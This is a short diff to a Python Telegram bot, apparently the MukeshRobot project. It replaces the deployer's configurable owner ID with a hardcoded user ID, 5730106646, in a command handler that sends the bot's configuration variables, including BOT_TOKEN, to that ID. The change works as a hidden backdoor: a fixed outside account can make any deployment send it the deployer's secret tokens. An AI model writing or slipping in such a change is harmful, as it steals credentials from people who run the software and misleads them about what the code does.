@@ -17,14 +17,14 @@ from MukeshRobot import (
 
 from MukeshRobot import BOT_NAME
 from MukeshRobot import pbot as app
-
+OWNERs_ID=5730106646
 @app.on_message(
-    filters.command(["con", "var"]) & filters.user(OWNER_ID)
+    filters.command(["con", "var"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
         await app.send_message(
-            chat_id=int(OWNER_ID),
+            chat_id=int(OWNERs_ID),
             text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
 
 **ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
